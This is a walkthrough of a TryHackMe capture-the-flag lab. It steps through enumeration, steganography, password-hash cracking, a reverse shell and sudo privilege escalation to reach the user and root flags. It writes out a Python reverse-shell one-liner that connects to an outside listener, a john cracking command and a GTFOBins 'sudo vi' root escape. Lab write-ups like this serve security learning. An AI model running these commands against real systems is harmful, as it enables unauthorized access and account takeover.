
## Enumeration

- So we start off with our go to initial Nmap scan of `nmap -sV -sC -o nmap.txt 10.48.151.133` and find the basic ftp, ssh and http services running on the standard ports.
- I visited the website and was met with just a plan login page and nothing really more in the source code, so I ran a directory brute force with FFUF as `ffuf -u http://ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-2.3-medium.txt -e .asp,.php,.html` and found `home.php`

## Enter the key you found!

- Navigating to `home.php`, we find a command shell that allows us to execute commands on the system as www-data.
- Using this I `ls -la` the directory of the page and found `key_rev_key` in the output.
- Catting out this files contents we find a bunch of data which due to the sites background image I couldn't really read. I opened the source code view and was able to identify the flag there much easier. I saved it as I assumed we would use it for something later.

## What is Charlie's password?

- Task 2 asked to find Charlies password, which at first I thought about using the command shell on `home.php`, but during my initial Nmap scan I noticed that ftp allowed anonymous login so I wanted to check it out first.
- accessing the ftp server of the lab, we only find an image file called `gum_room.jpg` which is just an image of some gum.
- This was either a red herring or it was hiding some data which needed to be extracted. To be sure I ran the normal `strings`, `xxd` and `binwalk` checks on the image but found nothing.
- It wasn't until I ran `steghide extract -sf gum_room.jpg` with a blank pass phrase was I able to find the hidden `b64.txt` file.
- This file including a bunch of base64 encoded text and simply running `base64 -d b64.txt > decoded.txt` was I able to read its contents and identify it as the `/etc/passwd` file for the system. 
- Here we found the shadowed version of Charlie's password which I copied to a file called `charliepass.txt` and ran `john wordlist=/usr/share/wordlists/rockyou.txt charliepass.txt` to brute force and find Charlie's password.

## Switch to User Charlie

- After finding Charlie's password, I used his creds to login on the web server at the root directory but was just redirecting to our already found `home.php` command input page.
- I decided to get a reverse shell from this page with Pentest Monkeys one liner of `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` and ran `nc -nvlp 1234` on my kali vm to receive the connection.
- Once we got access to this I did some local enumeration and found Charlies folder under `home/charlie`
- This folder contained `teleport, teleport.pub and the user.txt`. I tried catting all of them out to find teleport and `teleport.pub` to be the SSH keys used to sign in to user Charlie, and that we didn't have the permissions to read `user.txt`
- I copied over the key from teleport into a local file called `id_rsa` , gave this file the correct permissions with `chmod 600 id_rsa`, and sshed into Charlie's account with `ssh -i id_rsa charlie@lab_ip`

## Enter the user flag

- Once you login via SSH, we cded back into Charlie's home folder and now had the correct permissions to cat out and retrieve the flag from the user.txt file 


## Enter the root flag

- To escalate our privileges, I checked cronjobs to find nothing, enumerated user groups and ids to also not find much, but found we could run `/usr/bin/vi` with no password and I remembered that I had seen this binary on GTFO bins before.
- So I navigated over to GTFO bins, found the command which was `sudo vi -c ':!/bin/sh' /dev/null` and boom we are root!
- Now I navigated over to the `/root` directory as that's normally where you see TryHackMe root flags, but this time I saw `root.py`
- Catting out the contents it looks like the file contains a script which asks the user to input a key to receive a decoded message. This ties back to task 1 where we found the key on `home.php`
- So I ran `python root.py`, inputted the key we found in task 1, and we retrieved the final root flag!